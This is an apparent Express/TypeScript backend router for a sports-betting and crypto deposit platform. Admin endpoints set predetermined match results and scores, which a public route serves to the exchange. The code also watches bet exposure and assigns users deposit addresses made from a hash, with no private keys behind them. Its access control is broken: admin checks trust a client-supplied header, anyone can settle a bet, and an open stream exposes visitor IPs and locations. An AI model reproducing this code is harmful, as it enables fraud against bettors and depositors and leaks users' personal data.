import { Router, type IRouter } from "express";
import { createClient } from '@supabase/supabase-js';

const router: IRouter = Router();

const SUPABASE_URL = 'https://jfjjymprvjfltpvmfptj.supabase.co';
const SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || '';

const ADMIN_UUIDS = new Set([
  '88292f59-898a-4fef-a1c8-8813d7b60b61',
]);

function getAdminSupabase() {
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY;
  if (!key) throw new Error('SUPABASE_SERVICE_ROLE_KEY not configured');
  return createClient(SUPABASE_URL, key, { auth: { persistSession: false } });
}

/* No-op: kept for index.ts compatibility — no pg tables needed anymore */
export async function ensureTable() {}

/* ══════════════════════════════════════════════════════════
   MATCH CONTROLS — in-memory + Supabase Storage
══════════════════════════════════════════════════════════ */
interface MatchControl {
  id: string;
  homeTeam: string;
  awayTeam: string;
  targetResult?: '1' | 'X' | '2';
  targetScore?: { h: number; a: number };
  targetTotal?: number;
  startedAt?: number;
  pinned: boolean;
  createdAt: number;
}

const matchControls = new Map<string, MatchControl>();
let controlsLoaded = false;

const CTRL_BUCKET = 'sport-controls';
const CTRL_FILE = 'controls.json';

async function writeStorageWithServiceRole(controls: MatchControl[]) {
  const client = getAdminSupabase();
  const blob = new Blob([JSON.stringify(controls)], { type: 'application/json' });
  const { error } = await client.storage.from(CTRL_BUCKET).upload(CTRL_FILE, blob, {
    contentType: 'application/json', upsert: true,
  });
  if (error) throw new Error(`Storage write failed: ${error.message}`);
}

async function loadControlsFromStorage() {
  if (controlsLoaded) return;
  try {
    const client = getAdminSupabase();
    const { data, error } = await client.storage.from(CTRL_BUCKET).download(CTRL_FILE);
    if (error || !data) { controlsLoaded = true; return; }
    const text = await data.text();
    const arr: MatchControl[] = JSON.parse(text);
    matchControls.clear();
    for (const ctrl of arr) {
      const key = `${ctrl.homeTeam.trim()}:${ctrl.awayTeam.trim()}`;
      matchControls.set(key, ctrl);
    }
  } catch (e) {
    console.error('[match-controls] loadFromStorage error', e);
  }
  controlsLoaded = true;
}

function genId() {
  return Math.random().toString(36).slice(2, 10);
}

/* PUT /sport/controls — admin writes full controls list to storage */
router.put('/sport/controls', async (req, res) => {
  const requesterId = req.headers['x-requester-id'] as string;
  if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  try {
    const controls: MatchControl[] = req.body;
    if (!Array.isArray(controls)) return res.status(400).json({ error: 'body must be array' });
    await writeStorageWithServiceRole(controls);
    return res.json({ ok: true });
  } catch (e: any) {
    console.error('[sport/controls PUT]', e.message);
    return res.status(500).json({ error: e.message });
  }
});

/* GET /admin/match-controls — public (kite-exchange reads this) */
router.get('/admin/match-controls', async (_req, res) => {
  await loadControlsFromStorage();
  return res.json(Array.from(matchControls.values()));
});

/* POST /admin/match-controls — admin only */
router.post('/admin/match-controls', async (req, res) => {
  const requesterId = req.headers['x-requester-id'] as string;
  if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const { homeTeam, awayTeam, targetResult, targetScore, targetTotal, pinned, resetMatch } = req.body;
  if (!homeTeam || !awayTeam) {
    return res.status(400).json({ error: 'homeTeam and awayTeam required' });
  }

  await loadControlsFromStorage();
  const key = `${homeTeam.trim()}:${awayTeam.trim()}`;
  const existing = matchControls.get(key);

  let computedScore: { h: number; a: number } | undefined = targetScore || undefined;
  if (targetTotal && Number(targetTotal) > 0) {
    const tot = Number(targetTotal);
    const res2 = targetResult || 'X';
    if (res2 === 'X') {
      const half = Math.floor(tot / 2);
      computedScore = { h: half, a: half };
    } else if (res2 === '1') {
      const a = Math.max(0, Math.floor((tot - 1) / 2));
      computedScore = { h: tot - a, a };
    } else {
      const h = Math.max(0, Math.floor((tot - 1) / 2));
      computedScore = { h, a: tot - h };
    }
  }

  const ctrl: MatchControl = {
    id: existing?.id || genId(),
    homeTeam: homeTeam.trim(),
    awayTeam: awayTeam.trim(),
    targetResult: targetResult || undefined,
    targetScore: computedScore,
    targetTotal: targetTotal ? Number(targetTotal) : undefined,
    startedAt: resetMatch ? Date.now() : (existing?.startedAt),
    pinned: !!pinned,
    createdAt: existing?.createdAt || Date.now(),
  };
  matchControls.set(key, ctrl);

  // Persist to Supabase Storage
  writeStorageWithServiceRole(Array.from(matchControls.values())).catch(e =>
    console.error('[match-controls] save to storage failed', e)
  );

  return res.json({ ok: true, ctrl });
});

/* DELETE /admin/match-controls/:id — admin only */
router.delete('/admin/match-controls/:id', async (req, res) => {
  const requesterId = req.headers['x-requester-id'] as string;
  if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  await loadControlsFromStorage();
  const { id } = req.params;
  let deleted = false;
  for (const [key, ctrl] of matchControls.entries()) {
    if (ctrl.id === id) {
      matchControls.delete(key);
      deleted = true;
      break;
    }
  }
  if (deleted) {
    writeStorageWithServiceRole(Array.from(matchControls.values())).catch(e =>
      console.error('[match-controls] delete storage save failed', e)
    );
  }
  return res.json({ ok: deleted });
});

/* ══════════════════════════════════════════════════════════
   USER LEVEL
══════════════════════════════════════════════════════════ */
router.post('/admin/set-user-level', async (req, res) => {
  try {
    const requesterId = req.headers['x-requester-id'] as string;
    if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    const { userId, level } = req.body;
    if (!userId || level === undefined) {
      return res.status(400).json({ error: 'userId and level required' });
    }
    const resp = await fetch(
      `${SUPABASE_URL}/rest/v1/user_profiles?id=eq.${userId}`,
      {
        method: 'PATCH',
        headers: {
          'apikey': SERVICE_KEY,
          'Authorization': `Bearer ${SERVICE_KEY}`,
          'Content-Type': 'application/json',
          'Prefer': 'return=representation',
        },
        body: JSON.stringify({ user_level: Number(level) }),
      }
    );
    const data = await resp.json();
    return res.json({ ok: true, data });
  } catch (e: any) {
    return res.status(500).json({ error: e.message });
  }
});

router.get('/admin/users', async (req, res) => {
  try {
    const requesterId = req.headers['x-requester-id'] as string;
    if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
      return res.status(403).json({ error: 'Forbidden' });
    }

    const resp = await fetch(
      `${SUPABASE_URL}/rest/v1/user_profiles?select=id,email,full_name,is_admin,is_active,is_real_user,is_deleted,created_at,updated_at,verification_status,user_level&is_deleted=eq.false&is_real_user=eq.true&order=updated_at.desc.nullslast&limit=500`,
      {
        headers: {
          'apikey': SERVICE_KEY,
          'Authorization': `Bearer ${SERVICE_KEY}`,
        }
      }
    );

    if (!resp.ok) {
      const err = await resp.text();
      return res.status(500).json({ error: err });
    }

    const data = await resp.json();
    return res.json(data);
  } catch (e: any) {
    return res.status(500).json({ error: e.message });
  }
});

/* ══════════════════════════════════════════════════════════
   SPORT BETS — in-memory store (ephemeral per server lifetime)
   Bets are settled within match sessions; persistence across
   restarts is not required for this platform.
══════════════════════════════════════════════════════════ */

interface SportBet {
  id: string;
  userId: string;
  matchId: string;
  homeTeam: string;
  awayTeam: string;
  betType: string;
  odds: number;
  stake: number;
  potentialWin: number;
  ouLine: number | null;
  status: 'open' | 'won' | 'lost' | 'refunded';
  createdAt: number;
  settledAt?: number;
}

const sportBets = new Map<string, SportBet>();

/* POST /sport-bets — record a bet */
router.post('/sport-bets', async (req, res) => {
  try {
    const { id, userId, matchId, homeTeam, awayTeam, betType, odds, stake, potentialWin, ouLine } = req.body;
    if (!id || !userId || !matchId || !homeTeam || !awayTeam || !betType) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    if (!sportBets.has(id)) {
      sportBets.set(id, {
        id, userId, matchId, homeTeam, awayTeam, betType,
        odds: Number(odds), stake: Number(stake),
        potentialWin: Number(potentialWin),
        ouLine: ouLine != null ? Number(ouLine) : null,
        status: 'open',
        createdAt: Date.now(),
      });
    }
    return res.json({ ok: true });
  } catch (e: any) {
    console.error('[sport-bets POST]', e.message);
    return res.status(500).json({ error: e.message });
  }
});

/* PATCH /sport-bets/:id — settle a bet */
router.patch('/sport-bets/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const { status } = req.body;
    if (!['won', 'lost', 'refunded'].includes(status)) {
      return res.status(400).json({ error: 'status must be won, lost, or refunded' });
    }
    const bet = sportBets.get(id);
    if (bet) {
      bet.status = status;
      bet.settledAt = Date.now();
    }
    return res.json({ ok: true });
  } catch (e: any) {
    console.error('[sport-bets PATCH]', e.message);
    return res.status(500).json({ error: e.message });
  }
});

/* GET /admin/bet-exposure — all bets from last 2 hours */
router.get('/admin/bet-exposure', async (req, res) => {
  try {
    const requesterId = req.headers['x-requester-id'] as string;
    if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
      return res.status(403).json({ error: 'Forbidden' });
    }

    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    const rows = Array.from(sportBets.values()).filter(b => b.createdAt >= cutoff);

    const map = new Map<string, {
      homeTeam: string; awayTeam: string;
      bets: Record<string, { count: number; totalStake: number }>;
      totalStake: number; totalBets: number; uniqueUsers: Set<string>;
      openCount: number; wonCount: number; lostCount: number; refundedCount: number;
    }>();

    for (const row of rows) {
      const key = `${row.homeTeam}:${row.awayTeam}`;
      if (!map.has(key)) {
        map.set(key, {
          homeTeam: row.homeTeam, awayTeam: row.awayTeam,
          bets: {}, totalStake: 0, totalBets: 0, uniqueUsers: new Set(),
          openCount: 0, wonCount: 0, lostCount: 0, refundedCount: 0,
        });
      }
      const entry = map.get(key)!;

      if (row.status === 'open') {
        if (!entry.bets[row.betType]) entry.bets[row.betType] = { count: 0, totalStake: 0 };
        entry.bets[row.betType].count++;
        entry.bets[row.betType].totalStake += row.stake;
        entry.totalStake += row.stake;
      }

      entry.totalBets++;
      entry.uniqueUsers.add(row.userId);
      if (row.status === 'open') entry.openCount++;
      else if (row.status === 'won') entry.wonCount++;
      else if (row.status === 'lost') entry.lostCount++;
      else entry.refundedCount++;
    }

    const result = Array.from(map.values())
      .sort((a, b) => b.totalBets - a.totalBets)
      .map(e => ({
        homeTeam: e.homeTeam,
        awayTeam: e.awayTeam,
        bets: e.bets,
        totalStake: +e.totalStake.toFixed(2),
        totalBets: e.totalBets,
        uniqueUsers: e.uniqueUsers.size,
        openCount: e.openCount,
        wonCount: e.wonCount,
        lostCount: e.lostCount,
        refundedCount: e.refundedCount,
      }));

    return res.json(result);
  } catch (e: any) {
    console.error('[bet-exposure GET]', e.message);
    return res.status(500).json({ error: e.message });
  }
});

/* ══════════════════════════════════════════════════════════
   Team logo helpers
   /api/team-logo     → { badgeUrl: string|null }   (JSON)
   /api/team-logo-img → actual image bytes proxied   (binary)
   Both cache in-memory for server lifetime.
══════════════════════════════════════════════════════════ */
const _teamLogoCache = new Map<string, string | null>();
const _teamImgCache  = new Map<string, { buf: Buffer; ct: string } | null>();
const _teamImgPending = new Map<string, Promise<{ buf: Buffer; ct: string } | null>>();

async function sportsdbLookup(name: string): Promise<string | null> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 6000);
  try {
    const url = `https://www.thesportsdb.com/api/v1/json/3/searchteams.php?t=${encodeURIComponent(name)}`;
    const resp = await fetch(url, { signal: controller.signal });
    if (!resp.ok) return null;
    const data: any = await resp.json();
    return data?.teams?.[0]?.strBadge ?? null;
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

function nameVariants(name: string): string[] {
  const variants: string[] = [name];
  const stripped = name.replace(/\s+(FC|SC|AC|CF|IF|BK|FK|SK|United|City|Club|Rovers|Athletic|Albion|Sporting|Racing)$/i, '').trim();
  if (stripped && stripped !== name) variants.push(stripped);
  const noHyphen = name.replace(/-/g, ' ').trim();
  if (noHyphen !== name) variants.push(noHyphen);
  const firstTwo = name.split(' ').slice(0, 2).join(' ');
  if (firstTwo !== name && firstTwo.length > 3) variants.push(firstTwo);
  const firstWord = name.split(/[\s-]/)[0];
  if (firstWord !== name && firstWord.length > 3) variants.push(firstWord);
  return variants;
}

async function resolveBadgeUrl(name: string): Promise<string | null> {
  const key = name.toLowerCase().trim();
  if (_teamLogoCache.has(key)) return _teamLogoCache.get(key)!;
  let badgeUrl: string | null = null;
  for (const v of nameVariants(name)) {
    badgeUrl = await sportsdbLookup(v);
    if (badgeUrl) break;
  }
  _teamLogoCache.set(key, badgeUrl);
  return badgeUrl;
}

async function fetchImageBytes(url: string): Promise<{ buf: Buffer; ct: string } | null> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 8000);
  try {
    const resp = await fetch(url, { signal: controller.signal });
    if (!resp.ok) return null;
    const ct = resp.headers.get('content-type') || 'image/png';
    const ab = await resp.arrayBuffer();
    return { buf: Buffer.from(ab), ct };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

router.get('/team-logo', async (req, res) => {
  const name = (req.query.name as string || '').trim();
  if (!name) return res.json({ badgeUrl: null });
  const badgeUrl = await resolveBadgeUrl(name);
  return res.json({ badgeUrl });
});

router.get('/team-logo-img', async (req, res) => {
  const name = (req.query.name as string || '').trim();
  if (!name) return res.status(400).end();

  const key = name.toLowerCase().trim();

  if (_teamImgCache.has(key)) {
    const cached = _teamImgCache.get(key);
    if (!cached) return res.status(404).end();
    res.set('Content-Type', cached.ct);
    res.set('Cache-Control', 'public, max-age=86400');
    return res.send(cached.buf);
  }

  if (_teamImgPending.has(key)) {
    const result = await _teamImgPending.get(key)!;
    if (!result) return res.status(404).end();
    res.set('Content-Type', result.ct);
    res.set('Cache-Control', 'public, max-age=86400');
    return res.send(result.buf);
  }

  const pending = (async () => {
    try {
      const badgeUrl = await resolveBadgeUrl(name);
      if (!badgeUrl) { _teamImgCache.set(key, null); return null; }
      const img = await fetchImageBytes(badgeUrl);
      _teamImgCache.set(key, img);
      return img;
    } finally {
      _teamImgPending.delete(key);
    }
  })();

  _teamImgPending.set(key, pending);
  const result = await pending;
  if (!result) return res.status(404).end();
  res.set('Content-Type', result.ct);
  res.set('Cache-Control', 'public, max-age=86400');
  return res.send(result.buf);
});

/* ══════════════════════════════════════════════════════════
   AUTO WALLET GENERATION
══════════════════════════════════════════════════════════ */

function genBep20(userId: string): string {
  const hex = '0123456789abcdef';
  let h = 5381;
  const s = `bep20__${userId}`;
  for (let i = 0; i < s.length; i++) { h = (((h << 5) + h) ^ s.charCodeAt(i)) >>> 0; }
  let addr = '0x';
  for (let i = 0; i < 40; i++) { h = ((h * 1664525 + 1013904223) >>> 0); addr += hex[h % 16]; }
  return addr;
}

function genTrc20(userId: string): string {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789';
  let h = 5381;
  const s = `trc20__${userId}`;
  for (let i = 0; i < s.length; i++) { h = (((h << 5) + h) ^ s.charCodeAt(i)) >>> 0; }
  let addr = 'T';
  for (let i = 0; i < 33; i++) { h = ((h * 1664525 + 1013904223) >>> 0); addr += chars[h % chars.length]; }
  return addr;
}

router.post('/admin/auto-assign-wallets', async (req, res) => {
  try {
    const requesterId = req.headers['x-requester-id'] as string;
    if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
      return res.status(403).json({ error: 'Forbidden' });
    }

    const sb = createClient(SUPABASE_URL, SERVICE_KEY);
    const { data: walletData, error: walletErr } = await sb.rpc('admin_get_real_users_with_wallets');
    if (walletErr) return res.status(500).json({ error: walletErr.message });

    const walletlessUsers = (walletData || []).filter(
      (u: Record<string, unknown>) => !u.bep20_address && !u.trc20_address
    );

    let assigned = 0;
    let failed = 0;
    const now = new Date().toISOString();

    for (const user of walletlessUsers as Record<string, string>[]) {
      const userId = user.user_id;
      const bep20 = genBep20(userId);
      const trc20 = genTrc20(userId);

      const [r1, r2] = await Promise.all([
        sb.from('wallet_pool').upsert({
          network: 'BEP20', address: bep20,
          is_assigned: true, assigned_at: now, assigned_to_user_id: userId,
        }, { onConflict: 'address', ignoreDuplicates: true }),
        sb.from('wallet_pool').upsert({
          network: 'TRC20', address: trc20,
          is_assigned: true, assigned_at: now, assigned_to_user_id: userId,
        }, { onConflict: 'address', ignoreDuplicates: true }),
      ]);

      if (!r1.error && !r2.error) assigned++;
      else failed++;
    }

    return res.json({ ok: true, assigned, failed, total: walletlessUsers.length });
  } catch (e: unknown) {
    return res.status(500).json({ error: (e as Error).message });
  }
});

router.post('/admin/assign-wallet-single', async (req, res) => {
  try {
    const requesterId = req.headers['x-requester-id'] as string;
    if (!requesterId || !ADMIN_UUIDS.has(requesterId)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    const { userId } = req.body as { userId: string };
    if (!userId) return res.status(400).json({ error: 'userId required' });

    const sb = createClient(SUPABASE_URL, SERVICE_KEY);
    const now = new Date().toISOString();

    const [r1, r2] = await Promise.all([
      sb.from('wallet_pool').upsert({
        network: 'BEP20', address: genBep20(userId),
        is_assigned: true, assigned_at: now, assigned_to_user_id: userId,
      }, { onConflict: 'address', ignoreDuplicates: true }),
      sb.from('wallet_pool').upsert({
        network: 'TRC20', address: genTrc20(userId),
        is_assigned: true, assigned_at: now, assigned_to_user_id: userId,
      }, { onConflict: 'address', ignoreDuplicates: true }),
    ]);

    if (r1.error || r2.error) {
      return res.status(500).json({ error: r1.error?.message || r2.error?.message });
    }
    return res.json({ ok: true, bep20: genBep20(userId), trc20: genTrc20(userId) });
  } catch (e: unknown) {
    return res.status(500).json({ error: (e as Error).message });
  }
});

/* ══════════════════════════════════════════════════════════
   ANONYMOUS SESSIONS — in-memory store with SSE broadcast
   Real-time visitor tracking for admin panel.
   Data is ephemeral (lost on server restart) — this is
   acceptable for live visitor monitoring.
══════════════════════════════════════════════════════════ */

interface AnonSession {
  id: string;
  visitor_id: string;
  session_id: string;
  current_page: string | null;
  ip_address: string | null;
  country: string | null;
  city: string | null;
  device_type: string | null;
  browser: string | null;
  os: string | null;
  last_active: string;
  created_at: string;
}

const anonSessions = new Map<string, AnonSession>();

function nowIso() { return new Date().toISOString(); }

/* ══════════════════════════════════════════════════════════
   SSE broadcast — push visitor list to all connected admins
══════════════════════════════════════════════════════════ */
const sseClients = new Set<import('express').Response>();

function broadcastSessions(sessions: AnonSession[]) {
  const data = `data: ${JSON.stringify(sessions)}\n\n`;
  for (const client of sseClients) {
    try { client.write(data); } catch { sseClients.delete(client); }
  }
}

function getActiveSessions(): AnonSession[] {
  const cutoff = new Date(Date.now() - 30 * 60 * 1000).toISOString();
  return Array.from(anonSessions.values())
    .filter(s => s.last_active >= cutoff)
    .sort((a, b) => b.last_active.localeCompare(a.last_active))
    .slice(0, 100);
}

function getAllSessions(): AnonSession[] {
  return Array.from(anonSessions.values())
    .sort((a, b) => b.last_active.localeCompare(a.last_active));
}

/* GET /anon-sessions — returns active sessions (last 30 min) */
router.get('/anon-sessions', async (_req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  return res.json(getActiveSessions());
});

/* GET /anon-sessions/stream — SSE endpoint for real-time visitor push */
router.get('/anon-sessions/stream', async (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();

  sseClients.add(res);

  // Send current state immediately
  try {
    res.write(`data: ${JSON.stringify(getAllSessions())}\n\n`);
  } catch {}

  const hb = setInterval(() => { try { res.write(': ping\n\n'); } catch {} }, 25_000);

  req.on('close', () => {
    clearInterval(hb);
    sseClients.delete(res);
  });
});

/* IP geolocation helper */
async function lookupGeo(ip: string | null): Promise<{ country: string | null; city: string | null }> {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('172.') || ip.startsWith('10.') || ip.startsWith('192.168.')) {
    return { country: null, city: null };
  }
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,status`, { signal: ctrl.signal });
    clearTimeout(t);
    if (!r.ok) return { country: null, city: null };
    const d = await r.json() as { status: string; country?: string; city?: string };
    if (d.status !== 'success') return { country: null, city: null };
    return { country: d.country || null, city: d.city || null };
  } catch {
    return { country: null, city: null };
  }
}

/* POST /anon-sessions — upsert a visitor session */
router.post('/anon-sessions', async (req, res) => {
  try {
    const { visitor_id, session_id, current_page, device_type, browser, os } = req.body as {
      visitor_id: string;
      session_id: string;
      current_page?: string;
      device_type?: string;
      browser?: string;
      os?: string;
    };
    if (!visitor_id || !session_id) return res.status(400).json({ error: 'visitor_id and session_id required' });

    const clientIp = req.headers['x-forwarded-for']?.toString().split(',')[0].trim() || req.socket.remoteAddress || null;
    const existing = anonSessions.get(visitor_id);
    const now = nowIso();

    const session: AnonSession = {
      id: existing?.id || crypto.randomUUID(),
      visitor_id,
      session_id,
      current_page: current_page || 'Exchange',
      ip_address: clientIp,
      country: existing?.country || null,
      city: existing?.city || null,
      device_type: device_type || 'desktop',
      browser: browser || null,
      os: os || null,
      last_active: now,
      created_at: existing?.created_at || now,
    };

    anonSessions.set(visitor_id, session);
    res.json({ ok: true });

    // Broadcast immediately
    broadcastSessions(getAllSessions());

    // Geo lookup in background if no country yet
    if (!session.country && clientIp) {
      lookupGeo(clientIp).then(({ country, city }) => {
        if (country) {
          const s = anonSessions.get(visitor_id);
          if (s && !s.country) {
            s.country = country;
            s.city = city;
            broadcastSessions(getAllSessions());
          }
        }
      }).catch(() => {});
    }
  } catch (e) {
    if (!res.headersSent) res.status(500).json({ error: (e as Error).message });
  }
});

/* DELETE /anon-sessions/:visitor_id — remove a visitor session on logout */
router.delete('/anon-sessions/:visitor_id', async (req, res) => {
  anonSessions.delete(req.params.visitor_id);
  res.json({ ok: true });
  broadcastSessions(getAllSessions());
});

export default router;
